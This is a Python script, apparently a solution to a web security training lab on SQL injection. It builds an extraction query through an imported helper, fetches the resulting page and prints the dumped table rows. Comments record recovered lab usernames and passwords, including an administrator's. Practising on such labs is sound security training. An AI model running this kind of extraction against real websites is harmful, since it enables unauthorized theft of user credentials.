from methods import SQLi,path
from bs4 import BeautifulSoup
import sys


if __name__=="__main__":
    try:
        print(sys.argv)
        url=sys.argv[1].strip()    
        table=sys.argv[2].strip() 
        columns=[]
        condition=sys.argv[-1].strip() if sys.argv[-2].strip()=="-if" else ""
        n=len(sys.argv) - 2 if sys.argv[-2].strip()=="-if" else len(sys.argv)
        for i in range(3,n):
            columns.append(sys.argv[i].strip())
        
        lab8=SQLi(url,path,"--")

        ver=lab8.find_version() 
        #found : PostgreSQL
        
        url=lab8.generate_payload(columns,table=table,condition=condition)
        res=lab8.session.get(url)
        bs=BeautifulSoup(res.text,'html.parser')
        fd=bs.find_all('tr')
        
        #found : col~table :  users_xsnlkq~username_fwcxmb \\ users_xsnlkq~password_xjmwrb
        #found :carlos~onsy4m8dpgsa2h19g35y
                #administrator~sp4a3jfhx8vxr16uk2rm
                #wiener~78eqlj1rh94jv62dnbl5


        print("\n[+] Resultat :\n\r")
        for f in fd:
            print(f.get_text())
    
    except IndexError:
        help="<table> <columns> [-if condition]"
        print(f"[?] Syntax: python3 {sys.argv[0].strip()} <url> {help}")
        print(f'[?] Example: python3 SQLi/lab9.py "https://sub.web-security-academy.net"  "users_xsnlkq" "username_fwcxmb" "password_xjmwrb"')
        exit(-1)
